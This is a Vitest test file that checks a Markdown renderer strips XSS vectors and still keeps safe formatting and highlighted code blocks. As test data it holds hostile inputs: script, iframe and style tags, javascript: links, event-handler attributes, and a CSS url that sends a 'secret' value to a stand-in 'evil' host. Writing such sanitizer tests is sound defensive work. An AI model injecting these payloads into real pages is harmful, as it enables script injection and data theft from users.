import { describe, it, expect } from "vitest";
import { renderMarkdown } from "../../../src/utils/MarkdownRenderer.js";

describe("renderMarkdown XSS sanitization", () => {
  it("strips <script> tags", () => {
    const html = renderMarkdown("Hello <script>alert('xss')</script> world");
    expect(html).not.toMatch(/<script/i);
    expect(html).not.toContain("alert('xss')");
  });

  it("strips <iframe> tags", () => {
    const html = renderMarkdown("<iframe src=\"http://evil\"></iframe>");
    expect(html).not.toMatch(/<iframe/i);
  });

  it("removes javascript: hrefs from links", () => {
    const html = renderMarkdown("[click](javascript:alert(1))");
    expect(html).not.toMatch(/javascript:/i);
  });

  it("strips <details open ontoggle> exfiltration vector", () => {
    const html = renderMarkdown(
      '<details open ontoggle="alert(1)">payload</details>',
    );
    expect(html).not.toMatch(/ontoggle/i);
    expect(html).not.toMatch(/<details/i);
  });

  it("strips <style> blocks that could exfiltrate via CSS", () => {
    const html = renderMarkdown(
      "<style>body{background:url(http://evil/?x=secret)}</style>",
    );
    expect(html).not.toMatch(/<style/i);
  });

  it("strips inline event handlers from arbitrary tags", () => {
    const html = renderMarkdown('<span onmouseover="alert(1)">hi</span>');
    expect(html).not.toMatch(/onmouseover/i);
  });

  it("preserves safe markdown (code blocks, links with https, bold/italic)", () => {
    const html = renderMarkdown(
      "**bold** and [ok](https://example.com) and `inline code`",
    );
    expect(html).toMatch(/<strong>bold<\/strong>/);
    expect(html).toContain("https://example.com");
    expect(html).toMatch(/<code>inline code<\/code>/);
  });

  it("renders fenced code blocks with highlight.js output intact", () => {
    const html = renderMarkdown("```js\nconst a = 1;\n```");
    expect(html).toMatch(/<pre>/);
    expect(html).toMatch(/<code class="hljs/);
  });
});
